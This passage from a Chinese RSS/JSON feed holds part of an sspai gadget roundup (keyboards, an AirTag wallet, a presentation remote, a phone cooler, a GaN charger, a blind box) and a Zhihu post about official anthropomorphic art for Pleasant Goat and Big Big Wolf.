的配件算是比较齐全，键盘收纳包和数据线之类的小东西都有提供，还包括一枚纪念牌。作为一把 Gasket 结构的键盘，它的手感并不像大部分 Gasket 爱好者追捧的那样软弹，可能因为大量采用硅胶垫填充空腔，又提供了螺丝锁住内胆辅助热插拔，这把键盘的手感称得上「扎实」。其实为了追求 Gasket 结构能提供的特殊手感，有不少第三方也做了 IKKI68 的替换配件，Poron 材质的夹心棉啊，更软弹的吸音底棉啊，PC 材质定位板之类种种应有尽有。官方的配件包也附带了 Poron 材质的垫片。但我觉得没什么必要，每把键盘按起来都一个样子也没什么意思，适合自己才是最重要的。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4jkahtb34t9abj2c8i0.jpeg\"></figure><p>和我手里的其他键盘相比，IKKI68 Aurora 最大的特点是它的多配列支持。这是我唯一一把热插拔轴体同时兼容多种配列的键盘。虽然（为了用上手头的键帽）我目前只是上了基础布局，但只要我愿意，它分分钟就能变成 7 字回车分裂左 Shift 的欧式布局，也可以分裂退格、分裂空格、换上阶梯大写锁定。再加上黑透外壳对键帽颜色的高兼容性，称得上最好用的键帽架子。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4jkaidb34t9abj2c8ig.jpeg\"><figcaption>这个水波纹的铭牌让我觉得 Wi-Fi 信号很强</figcaption></figure><p>最近我给它上了陆逊的 GFG 轴，配一套用了很久的 ADA 高度键帽日用。没什么光污染，手感沉稳，换轴方便，结构稳定，虽然称不上物超所值，但这钱花得绝对不亏。唯一的问题是 Logo 灯上原装的无缺工作室小铁片很容易滑偏，过段时间我重新拆开，整个自己的 Logo 纸片换上去，还能玩把定制。考虑到存量大，二手价格不虚高，以及 R2 开团在即，这键盘可以说是日用良物了。</p>\n<h2>@老麦：Frenchie AirTag 真皮钱包</h2>\n<ul>\n<li>入手渠道：海外官网</li>\n<li>入手价格：合人民币 577+104 关税</li>\n</ul>\n<p>首先，我们到底需不需要一个钱包？我之前用的 Bellroy 钱包，最近不知道哪去了，连带着驾照和一堆银行卡，我找遍了车里，家里，办公室，没有任何影子。好在身份证没有放在钱包里，丢失的卡证补办也还算方便，但我最郁闷的是，一直觉得它是掉到哪个空隙里，而不是真的丢了。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4jkaitb34t99b7ntgdg.jpeg\"></figure><p>所以，那天看到水獭发这个钱包的信息，我立马来了兴趣，费了九牛二虎之力在海外官网填资料，扣款，89 刀的价格不算便宜，算是为它的创意和我的痛点买单。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4jkaj5b34t9arh0b4bg.jpeg\"></figure><p>没有额外收运费，但是这个效率也是太低了，一个月之后，终于收到了 DHL 的电话，通知我海关申报，微信端一通操作，扣了我 104 块关税，这个钱包已经 700 块了。对了，还要自己买一个 AirTag，官网 200 多，好在我刚好路过华强北，省了一半的价钱。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/26/c661d49083897b8c7129a864c1236ca4.png\"></figure><p>回归正题，钱包整体质感还可以，皮质挺柔软，具体几层皮，什么皮就不懂了。但做工还是有点毛糙，比如最里边的收角不平整，拉带缝的也不算工整，看样子的确不是中国制造。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4jkajtb34t9arh0b4c0.gif\"></figure><p>设计和创意还是不错的，AirTag 从钱包内的开口放进去，刚好漏出 Apple 的漂亮 logo，兼具装饰作用，外层很紧，放一个身份证就行，中间层比较松，收纳三四张卡都可以，现金是缠绕在钱包内侧的，隐藏的比较好，但装不了太多。</p>\n<p>综合来说，海淘下来成本过高，900 块的成本，帮大家趟个坑，但国内厂商是可以考虑类似产品的，防君子不防小人，至少掉在空隙里能找到，如果被偷了，拔了电池，也会有个最后信号位置，让你死心塌地。</p>\n<h2>@阿振：罗技 Spotlight「无激光」演示笔</h2>\n<p>作为一个产品应用工程师，经常到处出差到客户现场做产品技术培训，所以 EDC 必备一支激光笔翻页笔，我现在使用的是从我入职开始就一直陪着我的诺为 N31mini 精华版，听着名字是不是就知道集小巧与全能于一身。</p>\n<p>白色的笔身足够简单，除了两个翻页按键之外，N3mini 也确实比常规的翻页笔多了「ENTER」和「TAB」两个按钮，方便播放 PPT 中插入的视频。自带红色激光灯，用了三年多，除了按钮需要多用些力之外，也没有任何的问题，而且相当便宜。</p>\n<p>可一样东西被淘汰不一定是它本身出现了问题，而是它所处的时代局限了它。为什么这么说呢？因为斗转星移，客户现场再也不是统一的 BenQ 1024*768 分辨率的投影仪搭配卷边幕布的组合了，取而代之的是各种会议室专用大屏、专业 LED 屏幕，甚至有客户买了一台红米 86 寸的电视作为会议屏幕（当然开机就是晓彤的卫生巾广告和威猛先生洗厕所够不够商务就另当别论了）。</p>\n<p>在这些电子屏幕上，激光笔的亮点几乎不可见，我也不得不坐着使用 PPT 自带鼠标指针模拟激光笔的功能。但这样就比较影响我和客户的互动以及肢体语言的表达。</p>\n<p>所以，我就想到了以前一直心水的演示神器，也是我 618 斥巨资购入的罗技 <a href=\"https://www.logitech.com.cn/zh-cn/products/presenters/spotlight-presentation-remote.910-004868.html\">Spotlight</a>，一款极为先进的无线演示器。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_azhen/16254102905780.jpg\" alt=\"IMG_2154\"><figcaption>Spotlight 的外观 | 尾巴拔出来是 USB 接收器</figcaption></figure><p>罗技的 Spotlight 本身跟 MacBook Pro 的铝合金质感很像，有深灰、银白和金黄三种配色可选，它的深灰比深空灰更深一些，附带了一个很有质感的皮套。而且，它可以说是把按键做到了最简化，依次是正面的「指针」、「下一页」和「上一页」三个，并且可以分别设置三个按钮双击或长按的额外功能。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_azhen/16254102906704.jpg\" alt=\"\"><figcaption>比如「按住下一页」可以选择的自定义功能</figcaption></figure><p>这款无线演示器有两种连接方式，接收器和蓝牙。前者接口为 USB A 口，蓝牙就更加通用一些，插上接收器电脑就会自动检测并提示安装驱动。而且官方宣称演示距离最远可以达到 30 米，常规的情况应该都可以覆盖。其他的具体细节参数大家可以去产品页面看到。</p>\n<p>在实际使用中，它首先解决了我上面说到的传统激光笔的痛点———无法搭配电子屏幕使用，顾名思义，Spotlight 可以通过在演示界面上增加一个聚光灯的效果，来实现内容的强调。除了聚光灯效果外，还有一个放大镜效果和模拟激光灯的效果，并且点按「指针」按钮可以模拟左键点击，用来播放幻灯片中的视频。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/04/200025356f0a3bdbdab93ad07eb64921.jpg\"><figcaption>聚光灯效果演示 | 可以看到这个效果其实是全局的</figcaption></figure><p>不同的指针效果可以通过快速双击「指针」按钮进行切换。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/11/3ef88ee26593e594038fbf97d66bac7c.GIF\"><figcaption>不同指针效果的切换</figcaption></figure><p>其次，虽然最核心的还是讲了什么，毕竟形式还是为了内容服务的，不过一个优雅的形式是更有利于演讲内容向听众的传递的。而且即使在普通的幕布上使用模拟的激光点，也会因为亮度一致而更加柔和不刺眼。</p>\n<p>然后，有很多人会经常使用演示现场的电脑进行播放，罗技也提供一个绿色版演示器软件，只要和演示文件一起拷到相应的电脑里打开即可，不需要任何管理员权限，可以说是非常周到了。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_azhen/16254102906729.png\" alt=\"Xnip2021-06-12_11-03-30\"><figcaption>绿色版演示文件包含 Win 版和 Mac 版</figcaption></figure><p>最后，非要说一点不足的话，其中一项「按住下一页按钮」的自定义功能，当设置为从当前页开始演示的时候，我猜测罗技是通过长按触发组合键来实现的，macOS 里默认是 <code>option+command+P</code>，所以只能触发 Keynote 演示，在 windows 里 Powerpoint 可以正常开始。</p>\n<p>总的来说，如果你经常需要做展示、培训或者演讲之类的工作，那么必然少不了翻页类演示工具，如果价格能够接受的话，罗技 Spotlight 值得成为你的下一个帮手。</p>\n<h2>@MickeyYin：Logitech MX Keys</h2>\n<p>对于每日坐在座位上对着显示器工作的上班族来说，个人觉得办公用品的好坏对工作效率和身体健康的影响还是蛮大的。于是趁着 618 的折扣，我把工位上的蓝牙键盘从罗技的 K380 换成了 MX Keys。</p>\n<p>之前用的 K380 其实是一款还不错的产品，价格适中，外观活泼，体积小巧，也支持三设备切换连接，不过缺点也很明显：圆形键帽面积较小，键程较短打字手感不佳，长时间使用会有点累，而新购入的 MX Keys 就解决了老键盘的问题。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/06/804e08f4e63efa81774418c5b7a0cc04.jpg\"></figure><p>MX Keys 的外观延续了和 MX Master 鼠标系列一贯的风格，键盘面板和键帽均为磨砂金属质感，深灰与碳黑的淡雅色调搭配，给人一种精致而又低调沉稳的商务感。键盘机身头部有着垫高的设计形成了一定的弧度，且圆角矩形的键帽带有中心下凹的设计，更加符合人体工程学，键程个人感觉在薄膜键盘里算是非常不错的，按键偏软，打字回弹力度适中，声音很轻，主观感觉长时间使用也非常舒适，手感甚至可以比肩 ThinkPad X1 Carbon。最下面的一排按键中的键帽同时标注了 opt/start、Command/Alt，因此对使用 macOS/Windows 多平台的用户也十分友好。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/06/34634e47cd872698341d3cb0e37ac595.jpg\"></figure><p>在键盘外观与手感之外，丰富的功能键定义选项也是一大亮点，相信使用 Logi 键盘/鼠标的同学都不会感到陌生。通过 Logi Options App，我们可以对顶部一排的功能键自由定制，像是亮度调节、音量调节、App 切换、背光调节、媒体控制都不在话下，当然也可以改成一键启动任意应用，对提高效率有一定帮助。配合 Flow 功能，还可以在不同平台间简单地传输文件。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/06/d0e244d7157bd655b31aa0ea22c55508.png\"></figure><p>对于在夜间使用的场景，MX Keys 自带了键盘背光以及相应的动作传感器，夜间感应到手掌接近时背光会自动亮起。</p>\n<p>此外，支持三设备切换、应用 USB Type-C 接口、较长的续航时间也是这款键盘的几个 feature。总的来说，MX Keys 拥有出色的做工质感、稳定的无线连接、舒适的键程/手感，是一把非常棒的蓝牙键盘，配合自家鼠标用那更是效率颇高，对得起促销期间的这个价格，当然如果有 87 键的版本就更好了。手边的初代 MX Master 使用时间已经快五年了，依然「健壮如初」，希望 MX Keys 也能拥有如此强盛的「生命力」。</p>\n<h2>@LumosNight：黑鲨冰封制冷背夹2·磁吸版</h2>\n<ul>\n<li>入手渠道：<a href=\"https://item.jd.com/100023038464.html\">京东自营</a>\n</li>\n<li>入手价格：249 元</li>\n</ul>\n<p>随着夏天到来，作为手游玩家的我越来越感受到手机散热压力的增大。经历了一次次手机过热导致的降频、降亮度以及甚至黑屏后，我决定为手机添加一件散热设备。参考 <a href=\"https://sspai.com/post/63371\" target=\"_blank\">往期新玩意</a> 的推荐，我首先在一个多月前购买了冰封散热背夹，制冷效果当然没得说，然而使用过程中还是有一些如遮挡按键这样的不便存在。在 618 前夕看到黑鲨新推出了冰封制冷背夹 2·磁吸版（后简称黑鲨磁吸背夹），便赶紧又购买了新款。</p>\n<p>黑鲨磁吸背夹的大小比官方 MagSafe 充电器稍大一圈，包装内除了磁吸背夹本身，还附带一个磁吸贴片，可以贴在没有 MagSafe 的其他电子产品上使其具备磁吸功能。除此之外，黑鲨磁吸背夹还附赠了一根 C2C 的线缆。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/09/be017517f85b52074ec00eda0a54cdc1.JPEG\"><figcaption>黑鲨冰封制冷背夹2·磁吸版</figcaption></figure><p>在使用了一段时间黑鲨磁吸背夹后，对比之前标准版的使用体验，我认为磁吸设计解决了标准版等其他夹持设计散热背夹的许多使用体验通病。最直观的便是没有了遮挡和挤压按键的问题，令许多按键更加靠下的手机也可以使用。其次是手机的放置问题，对于 MOBA、竞速等在游玩时需要双手握持手机的手游类型的玩家来说，夹持设计的散热背夹并没有什么问题，但作为一个挂机类手游的玩家，我在使用散热背夹的大部分时间并不需要双手握持手机，只需要将游戏设置好后把手机放在一边即可，夹持设计的背夹会使手机无法正常放置，屏幕朝下放置手机会变成悬空「翘翘板」，屏幕朝上放置却又会堵住进风口，黑鲨磁吸背夹解决了倒扣「翘翘板」问题，同时也可以当手机支架将手机横屏放置。除此之外，磁吸设计使黑鲨磁吸背夹可以随意调整充电线的方向，不会出现夹持设计的散热背夹边充电边散热时两条线缆张牙舞爪地从手机两侧伸出的不美观现象。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/09/53113099a3284efa6b518b62aeb91f0b.jpg\"><figcaption>磁吸设计（右下）大大优化了使用体验</figcaption></figure><p>在磁吸的使用体验上，黑鲨磁吸背夹不仅可以轻松吸起 226g 的 iPhone 12 Pro Max，晃动也不用担心会掉。背夹与手机的接触面是硅胶垫，不必担心频繁使用和强大吸力会对手机背板造成磨损。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/09/0ab3b32172d9683d093f1087e73baa12.gif\"><figcaption>磁力稳固</figcaption></figure><p>除了使用体验的改善，黑鲨磁吸背夹的制冷效果仍然出色。室温下很快就能在表面形成冷凝水的制冷能力，对夏天手机的散热效果可谓立竿见影。边充电边正常使用时，使用磁吸背夹可以感受到整个手机边框握起来都凉凉的，而在同时有线快充+高画质打大型游戏的极限发热情况下，也不会出现烫手、掉帧或降亮度的情况。</p>\n<p>美中不足的一点是 iPhone 的主要发热区域在摄像头旁边，但磁吸背夹的吸附区域为手机背部正中，所以在极限发热的情况下仍能感受到摄像头旁边区域是热的，不过得益于手机玻璃面板、金属中框等材料的导热能力，散热效果仍然可以说非常出色。</p>\n<p>相比于夹持设计的散热背夹，黑鲨冰封制冷背夹2 磁吸版在保持散热水平的基础上，提升了使用体验，拓展了使用场景。如果你和我一样有手机的降温需求但又不满足于夹持式背夹的使用体验的话，这应该是一个很好的选择。</p>\n<h2>@甜食：HyperJuice Stackable GaN 100W 充电头 </h2>\n<ul>\n<li>入手渠道：<a href=\"https://www.kickstarter.com/projects/hypershop/hyperjuice-stackable-gan-charger-65w-and-100w-usb-c/description\">Kickstarter</a>\n</li>\n<li>价格：$59</li>\n</ul>\n<p>HyperJuice 的这款产品是 2020 年 9 月在 Kickstarter 上开始众筹的，在我的记忆里，Hyper 一直都是主打高性能、喜欢创新产品型态的形象，虽然因为预算原因没真的买过，但一直印象不错，因此这次在 KS 上看到了这个设计上十分奇怪的产品，就拉着冤大头 Nick 老师凑单买了两个。因为疫情原因，众筹的发货时间一延再延，从原定的今年 1 月一直拖到了现在的 7 月，我直到前两天才真正收到了它。</p>\n<p>这次众筹的 HyperJuice Stackable GaN 系列最大的特点就是 Stackable——「叠叠乐」的设计。在普通的充电头的基础上，它在正面设计了一个两相插座，可以支持最高 1500W 的电器，这个设计最大的好处就是，只要插座本身的空间足够，这个充电头就可以不占用两相插口的位置了，适用于插座空间有限的旅行场景或者需要插大量 USB-C 设备的场景——你也可以买多个同样的 HyperJuice Stackable 充电头互叠在一起使用，最多可以叠六十个（官方说法（但到底是怎样的用户会有这种需求呢））。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/12/article/5c8c98eb5558be0d7240a89bbf1e1c2b\"><figcaption>官方宣传中的「叠叠乐」使用场景</figcaption></figure><p>不过，虽然产品经理的思路让人不太摸得着头脑，但是这款充电头的硬件本身还是相当不错的。我购买的 100W 版本拥有 3 个 USB-C 插口和 1 个 USB-A 插口（65W 版本为 2C1A），其中任何一个 USB-C 口盲插都可以支持最高 100W 的 PD 快充输出功率。100W 版本的尺寸为 85.4mm x 45mm x 30.5mm，重量 166g，基本上和我之前使用的 Zendure 旧款 65W GaN 2C1A 充电头长宽相仿，只是高出一截，不愧是曾经设计过市面上最小的（也是最早的） 100W GaN 充电头的 Hyper，这个尺寸比市面上大部分同样规格的 100W PD 充电头都要小上一些，更不用说它还多了一个堆叠的功能。65W 版本的尺寸是 72mm x 36mm x 30.5mm。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/12/c20626e15c48f055e86b1d16eb9afd93.JPEG\"><figcaption>外观上手</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/12/f94bc6e591c137a035d5561a96a3fcff.gif\"><figcaption>与旧版 Zendure 65W 的尺寸对比</figcaption></figure><p>可能是为了配合「叠叠乐」的设计，HyperJuice Stackable 的折叠插脚展开之后是和最大的底面垂直的，也就是说，它插在插座上时，是整体贴在墙上的状态，比起类似 Zendure 的那种更常见的充电头「竖在」插座上的设计，虽然会占用更多的插座空间，但是也让它垂直插在墙上时可以有更好的稳定性，目前采取这样设计的充电头并不多，如果你有类似的需求，那么这可能会是一款适合你的产品。而且话又说回来，虽然横着贴在插座上可能会挡住其他的插座，但是它自带一个插座呀，因此，如果把它插在书桌或者大电器背后，作为一些相对固定的 USB 设备的供电 hub，也是非常合适的，也不会影响把原先的电器继续插在它上面使用。</p>\n<p>使用了两天之后，我手上的这只充电头的发热还是比较正常的，只插一台 MacBook 13 的情况下，基本上只是稍微有些温热，而在同时插两三个设备的时候，发热和65W Zendure 充电头插 MacBook 时类似，会有明显发热但没有烫到拿不起来的程度。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/12/74c13a5bbc6506cbb7b0dd2d73a449fc.jpg\"><figcaption>「叠叠乐」模式，灰色插头为电风扇</figcaption></figure><p>价格方面，我参与众筹直接买两只 100W 版本的价格是 118 美元，换算成人民币大约是 380 多元人民币，对比市面上规格类似的产品，倍思的 4 口 GaN 充电器标价 249，闪极的标价 425，Zendure 的标价 398，Hyper 的这款价格倒是意外的不算离谱，而且产品的尺寸在这些竞品中还算比较苗条的。根据过往的经验，如果同样的产品在国内正式发售，价格兴许还会比 KS 众筹价格更便宜（Hyper 之前还因为这样的事情遭到过众筹参与者的声讨）。</p>\n<p>在设计方面，虽然众筹页面宣传图上都是常见的白色设计，但是众筹用户收到的都是黑色版本，并且不可选（又是一个让人很难理解的操作），白色是之后的市售版本。充电头本身的做工还是相当不错的，黑色哑光的塑料外壳手感舒适，两相插座部分的 Hyper 十字 logo 压印也很精细，折叠插脚的展开收起相当顺滑，阻尼适中。</p>\n<p>在充电头底部采取了一个看宣传图非常酷炫的橙色环形工作指示灯，我一开始还有些担心，这么大一个灯会不会显得太浮夸了，但收到之后我发现我的担心是多余的——这个指示灯的亮度控制得非常克制，克制到什么程度呢，只要我开着灯就几乎看不出来它亮没亮的程度。我手上这个黑色版本，除非关灯凑近看，指示灯的位置上基本上就只能看到一条黑色细缝而已。当然，这倒也不算什么影响使用的因素，不知道白色版本会不会看起来更亮一些。此外，这个充电头的上下底面，包括指示灯的窄缝的边缘都是直角收边，没做任何倒角，所以摸到的时候相当割手，算是一个外观设计上的缺憾吧。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/12/788731b7910494d0765052cd4be271d6.jpg\"><figcaption>非常克制的工作指示灯（使用 iPhone 夜间模式拍摄）</figcaption></figure><p>总结一下，HyperJuice Stackable 的优点大致有：</p>\n<ul>\n<li>独特的「叠叠乐」设计，如果你真的需要它，那么它会是你唯一的选择；</li>\n<li>横向的折叠插脚设计；</li>\n<li>在同规格产品中比较苗条的尺寸和还算有竞争力的价格。</li>\n</ul>\n<p>缺点则是：</p>\n<ul>\n<li>众筹阶段比较不稳定的品控；</li>\n<li>如果不需要额外的插座功能，多余的插座部分可能会增加损坏和脏污的可能；</li>\n<li>设计导致的底面较为割手；</li>\n<li>目前没有在国内发售，购买和售后较为麻烦。</li>\n</ul>\n<h2>彩蛋</h2>\n<ul>\n<li>入手渠道：名创优品实体店</li>\n<li>参考价格：29.9 元</li>\n</ul>\n<p>那天吃完饭例行逛一下名创优品，无意间看到货架上孤零零的两个唐三彩盲盒，我考虑了十秒钟后，决定把它们带回家解压解压。</p>\n<p>盲盒内含有考古模块、介绍书、迷你洛阳铲、小刷子各一。打开盲盒，首先吸引我的居然是附赠的工具洛阳铲，小小的一支，金属质感拿在手里很不错，可惜图腾纹理细节粗糙了点。考古模块是石膏材质的土坯，形状不是很规则，虽然外面有塑封，但第一个盲盒的考古模块还是受潮了，不过这也不是坏事儿。</p>\n<p>挖「文物」前需要自备一块海绵和一杯水，用于湿润考古模块。（如果想要挖掘难度更高也可以省略这一步。）正式考古的过程大概分为三步：第一步，先用洛阳铲挖开考古模块多余的土；第二步，用小刷子蘸水清理「文物」表面；第三步，简单粗暴用水清洗「文物」。挖掘一个「文物」花费的时间大概是 40min 左右，不过不到 10min 就能看出盲盒里是什么文物了，所谓盲盒的惊喜来得有点过早，但我更享受的是发现惊喜后继续专心挖掘、清理的过程，解压。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4jkaklb34t99b7ntgeg.gif\"></figure><p>挖出第一件「文物」还是觉得不过瘾，立刻开挖第二个，前前后后花的时间大概在 90 分钟左右，让这个夜晚带有一点新鲜感，专心挖掘的感觉也不错。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4jkallb34t9arh0b4cg.gif\"></figure><p>两个盲盒里分别挖出富贵象和双龙瓶，然而我心里期望的是稀有指数最低的花卉纹壶，本非洲人这次居然不是很非。不得不说，这个小玩意儿虽然是微缩版，但外形上来说还是很还原文物的。陶瓷材质、唐三彩配色，放在家里当摆件也是赏心悦目。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4jkamtb34t99b7ntgf0.jpeg\"></figure><figure class=\"ss-imgRows\" figcaption=\"\"><img src=\"https://cdn.sspai.com/editor/u_/c4jkanlb34t99b7ntgfg.jpeg\" alt=\"\"><img src=\"https://cdn.sspai.com/editor/u_/c4jkaodb34t9a5fkktsg.jpeg\" alt=\"\"></figure><p><strong>如果你也想分享「新玩意」🔉：</strong></p>\n<p>很多读者表示自己也有一些希望分享的有趣产品。为了能让更多读者参与，我们决定在「新玩意」栏目最后添加一个新的版块，邀请大家来 Matrix 社区发表文章分享你的「新玩意」，你只需要：</p>\n<ul>\n<li>在标题中标注「新玩意」</li>\n<li>用 500-1000 字介绍产品</li>\n<li>配上 1-2 张产品的实拍图片</li>\n<li><strong>在网站个人信息中补充支付宝账号</strong></li>\n</ul>\n<p>成功入选栏目还可以得到 108 元的「剁手抚恤金」🧧。如果你有兴趣参与，就赶紧来稿吧！</p>\n<p>&gt; 下载少数派 <a href=\"https://sspai.com/page/client\">客户端</a>、关注 <a href=\"https://sspai.com/s/J71e\">少数派公众号</a> ，了解更多的新玩意 🆒</p>\n<p>&gt; 特惠、好用的硬件产品，尽在 <a href=\"https://shop549593764.taobao.com/?spm=a230r.7195193.1997079397.2.2ddc7e0bPqKQHc\">少数派sspai官方店铺</a> 🛒</p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/68480"},{"title":"如何评价《喜羊羊与灰太狼》官方放出的拟人图？是什么水平？","date":"2021-08-26 07:20:17","description":"\n<p>    《喜羊羊与灰太狼》是面向全年龄层的经典国民动漫，迄今已经16年，很多观众在羊羊的陪伴下长大了，大家都很好奇长大后的羊狼会是什么样的呢？所以，我们这一次暑假热播新剧《羊村守护者4之决战次时代》正正以未来、成长为主题。</p>\n<p>    每个粉丝朋友的心里都会浮现不一样的“次时代”羊狼，有的观众喜欢羊羊们团队作战，勇敢可爱的一面，有的观众更想看到他们霸气黑化，反差大的一面，于是一些粉丝朋友开始进行同人创作，画出自己心中的“未来羊狼”。而我们作为官方也在密切关注大家的想法，持续开创一些新鲜好玩的花絮彩蛋，决定把基于剧集设定的，羊狼们更多元化的一面展现给大家，为羊狼们长大后的卡通形象，注入“拟人”加工，放大他们在《决战次时代》成长和变化特征，为角色增添一番视觉冲击性，给大家更多的新鲜感、惊喜感。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-043465941f29b57d5eed41ccd03ba7ac_720w.jpg?rss\" data-rawwidth=\"4961\" data-rawheight=\"3543\" data-size=\"normal\" data-caption=\"\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<h3>设计创作花絮：<b>当“次时代羊狼”走在拟人的路上</b>\n</h3>\n<p>     在设计《决战次时代》拟人图起初，羊村画师遇到了一个小难题：突出人物，背景要简约一些但是又不失特色。那除了造型外貌之外，在次时代里他们最大的特色是什么？武器装备便是不二之选了。于是画师在每张拟人图的背景里都淡淡地添上了他们的武器，简单得来又保留了完整性，把羊狼们在次时代里的特征特点从外貌穿着到装备都展示出来，即使是小灰灰，也有属于自己的“热能棒”和蓝牙耳机。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-c017947427d13dab754d9ffe602942e8_720w.jpg?rss\" data-rawwidth=\"3000\" data-rawheight=\"5333\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-c017947427d13dab754d9ffe602942e8\" data-watermark-src=\"v2-075b85bd31fe11e94a2c956ed2c6fb5f\" data-private-watermark-src=\"v2-5531cd1628d42dba73bc8c593446ae90\"></p>\n<p>      让画师纠结最久的是红太狼。其实画师们在作画时，为红太狼画过两个表情嘴巴，第一感觉是冷酷的嘴巴，后来觉得太酷了需要加点笑容，显得魅力御姐一些。但经过几思考讨论后，画师们一致认为特工化后的红太狼对喜怒哀乐的情感感知其实并不明显的，在执行任务的状态外形下，并无情感，只有在被灰太狼暖化后才露出久违的微笑，而拟人图里更想要凸出的是红太狼特工时期的冷酷、快准狠，升级版“狼女王”的设定，因此最终回到了最初的第一直觉----呈现无情冷酷美艳特工的拟人红太狼。     </p>\n<p><img src=\"https://pic3.zhimg.com/v2-ce3d57cc94f2cf815d532f6e0d89b729_720w.jpg?rss\" data-rawwidth=\"3000\" data-rawheight=\"5333\" data-size=\"normal\" data-caption=\"\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>       为什么次时代拟人图里喜羊羊会比小伙伴们都矮？“人家还是小孩子嘛~”在《决战次时代》里，十五年前的喜羊羊与灰太狼意外来到十五年后的“次时代”青青草原，遇到长大后的伙伴，开启了新的守护之战。这是剧集的重要开端，也是画师们设计时一个不可跳脱的设定，于是创作了这个还是少年时期的喜羊羊拟人。至于真正长大后的喜羊羊还是要留白给大家，发挥想象力，你们喜欢的喜羊羊是什么样子的，长大后的他就是什么样子啦！</p>\n<h3><b>多样每一次官拟都会碰撞出新一种火花</b></h3>\n<p>      早在《羊村守护者3之异国大营救》，我们便开始尝试结合剧集风格设定，绘制角色拟人图，当猫变成宫廷公主，当羊变成国风少年，想象力与中国风的碰撞，给大家带来了别样的角色拟人形象。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-8c227aa61e71f4796b853108b78b7f15_720w.jpg?rss\" data-rawwidth=\"3425\" data-rawheight=\"4961\" data-size=\"normal\" data-caption=\"\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>        在8月3日《喜羊羊与灰太狼》十六周年时，我们发布了《运动英雄传之筐出胜利》全员拟人手书短片 ，实现从拟人静态图到微动画手书，是我们近期做的一次比较大的尝试。许多粉丝观众前来热情三连，感受来自赛场上的一番热血，运动风的羊狼拟人手书记录了他们高光的一刻，向大家展示了羊狼们的少年气盛和在球赛里拼搏的英姿，更“接地气”地与少年，成年人们产生追逐篮球梦的共鸣。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-b31dcc234ae1a64a0929e5c2d670af07_720w.jpg?rss\" data-rawwidth=\"4961\" data-rawheight=\"3543\" data-size=\"normal\" data-caption=\"\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p></p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/xi-yang-yang-yu-hui-tai-lang-48-12?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">喜羊羊与灰太狼</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/482367510/answer/2085103610?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">472 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/367050319?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">如何评价喜羊羊系列新作《奇趣外星客》？</a><br><a href=\"http://www.zhihu.com/question/381190243?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">老版猪猪侠和新版猪猪侠，哪个更好看？</a><br>\n","link":"http://www.zhihu.com/question/482367510/answer/2085103610?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"中国有哪些很美的梯田？","date":"2021-08-26 04:01:32","description":"\n<p>8亿亩梯田——中国最美的山岭雕刻，请查收！</p>\n<p><img 